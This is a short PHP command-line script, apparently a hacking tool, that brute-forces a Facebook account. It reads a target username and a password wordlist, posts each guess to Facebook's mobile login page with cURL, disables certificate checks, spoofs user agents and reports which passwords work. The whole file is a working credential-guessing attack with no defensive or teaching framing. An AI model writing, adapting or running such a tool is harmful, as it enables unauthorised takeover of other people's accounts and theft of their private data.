<?php

@system ("clear");
error_reporting(0);
function bf($user, $pass) {
	$ua = 'user-agents.txt';
	$useragent = $ua[rand(0, count($ua) - 1)];
  $cookie = 'cookie.txt';
  touch ($cookie);
$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'https://m.facebook.com/login.php');
	curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$user.'&pass='.$pass.'&login=Login');
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
	curl_setopt($ch, CURLOPT_REFERER, 'https://m.facebook.com');
	$output = curl_exec($ch) or die('Can\'t access '.$url);
	if(stristr($output, '<title>Facebook</title>') || stristr($output, 'id="checkpointSubmitButton"')) {
		return TRUE;
	} else {
		return FALSE;
	}
}
$file = $_SERVER[argv][0];
$user = $_SERVER[argv][1];
$wordlist = $_SERVER[argv][2];
if(!empty($user) && !empty($wordlist)) {
  $passlist = file($wordlist);
  $passcount = count($passlist);
  print "\n\e[1;31m[!] \e[1;32mmengecheck \e[1;35m".$passcount." \e[1;33mpassword..\n\e[0m";
  foreach($passlist as $password) {
    $pass = substr($password, 0, strlen($password) - 1);
    if(bf(urlencode($user), urlencode($pass))) {
      print "\n\e[1;33m".$pass." : \e[1;32mOK\n\e[0m";
    } else {
      print "\n\e[1;33m".$pass." : \e[1;31mError\n\e[0m";
    }
  }
}
?>
